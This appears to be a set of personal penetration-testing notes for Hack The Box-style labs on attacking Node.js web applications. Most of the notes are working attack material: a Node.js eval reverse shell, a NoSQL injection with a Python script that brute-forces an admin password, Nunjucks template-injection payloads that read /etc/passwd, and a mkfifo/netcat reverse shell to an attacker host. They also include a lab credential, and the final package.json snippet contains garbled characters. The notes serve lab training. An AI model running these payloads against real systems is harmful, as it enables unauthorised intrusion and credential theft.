#### Enumeration
Capture url request in BurpSuite:
```
...
/api/users
...
```
Take a look at /api/users
Take the list of users, and a short list of passwords, and attack the login request.
Look for something that would need elevated privilges, like /api/settings.
```
{"color-theme":"light","lang":"en","admin":false}
```
Change admin value to true:
```
{"color-theme":"dark","admin":true}
```
#### Node.js (Express middleware)
Below we're able to test this input box by adding 1 + 1
![[Pasted image 20220304092318.png]]
and seeing the result of "2".
![[Pasted image 20220304092332.png]]
Let's try something more complicated:
```node - kali
(function(){
   return 2+2;
})();
```
![[Pasted image 20220304092443.png]]
and we see this also works
![[Pasted image 20220304092547.png]]
```node - kali
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(21, "$KALI", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
#### NodeBlog
Details on $ne
https://docs.mongodb.com/manual/reference/operator/query/ne/
```
http://10.129.96.160:5000/login
```
Capture in Burp, change Content-Type to json:
```BurpSuite - kali
Content-Type: application/json
```
Change the data body to json format:
```BurpSuite - kali
{"user":"admin","password":"admin"}
```
Send, notice we still get invalid password.  If we modify the username, we get invalid username, working as intended.
```BurpSuite - kali
{
	"user":"admin",
	"password":{
		"$ne":"admin"
	}
}
```
```bash - kali
mousepad login.py
```
```python - kali
import requests
import json
import string
import sys
def login(pw):
	payload = '{ "$regex":"%s"}' % pw
	data = {"user":"admin", "password": json.loads(payload)}
	r=requests.post("http://10.129.96.160:5000/login",json=data)
	if "Invalid Password" in r.text:
		return False
	return True
password = '^'
stop = False
while stop == False:
	for i in string.ascii_letters:
		sys.stdout.write(f"\r{password}{i}")
		if login(f"{password}{i}"):
			password += i
			if login(f"{password}$"):
				sys.stdout.write(f"\r{password}\r\n")
				sys.stdout.flush()
				stop=True
				break
			break
```
admin:IppsecSaysPleaseSubscribe
#### Command injection
First, we notice how the our input for the newsletter is reflected back to us.
![[Pasted image 20220218114838.png]]
Test for command injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
![[Pasted image 20220218114825.png]]
Capture in Burp, send to repeater.
#### Node JS command Injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
POC:
```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```
Final payload:
```
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@htb.us"
}
```
![[1._rlwrap]]
Reverse Shell
```
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $KALI 443 >/tmp/f')\")()}}@htb.us"
}
```
#### package.json
If found, evaluate for vulnerable dependencies.  Maybe this is something we can combine with Dependency-Check?!
```
"request”: "~2",
“saniti%e—htm'l": "1.4.2",
"sequelize": "~4",
```